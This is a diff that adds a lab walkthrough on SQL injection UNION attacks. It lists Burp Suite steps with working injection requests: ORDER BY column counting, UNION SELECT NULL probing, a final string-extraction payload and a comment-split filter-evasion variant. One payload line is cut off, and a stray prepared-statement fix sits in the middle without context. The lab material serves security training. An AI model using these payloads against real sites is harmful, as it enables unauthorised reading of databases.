@@ -1,0 +1,45 @@
+# SQL injection Lab4 : UNION Attack with String Extraction
+# Objective
+  Retrieve a specific string value from the database by:
+      Determining the number of columns
+      Identifying which column(s) support string data
+      Injecting a UNION attack to display a predefined string
+
+# Burp Suite
+  1.Configure Burp Proxy (127.0.0.1:8080)
+  2.Visit the vulnerable category page (e.g., Gifts)
+  3.Capture the request:
+      GET /filter?category=Gifts HTTP/1.1
+  4.Find Column Count (ORDER BY)
+      GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1
+  5.Verify with UNION
+      GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
+  6.String Column Identification
+      GET /filter?category=Gifts' UNION SELECT 'a',NULL,NULL-- HTTP/1.1
+      GET /filter?category=Gifts' UNION SELECT NULL,'a',NULL-- HTTP/1.1  ← Success (2nd column accepts strings)
+      GET /filter?category=Gifts' UNION
+  7.Final Exploit
+      GET /filter?category=Gifts' UNION SELECT NULL,'YOUR_LAB_STRING',NULL-- HTTP/1.1
+    Replace YOUR_LAB_STRING with the random string provided in the lab instructions
+  8.Column Count Testing:
+      Position: ORDER BY §1§--
+      Payload: Numbers 1-10
+      Grep: "Internal Server Error"
+      String Column Finder:
+         GET /filter?category=Gifts' UNION SELECT §NULL§,'a',§NULL§-- HTTP/1.1
+    String query = "SELECT * FROM products WHERE category = ?";
+    PreparedStatement stmt = connection.prepareStatement(query);
+    stmt.setString(1, category);
+
+# Troubleshooting 
+  Try all column positions
+  Verify string matches lab requirements exactly
+      GET /filter?category=Gifts' UN/**/ION SEL/**/ECT NULL,'abc',NULL-- 
+    Try different string formats: 'a', "a", CHR(97)
+
+# Common Mistakes
+    1. Forgetting the trailing comment (`--`)
+    2. Not URL-encoding special characters
+    3. Using wrong string case (exact match required)
+    4. Missing the NULL balance for all columns
+
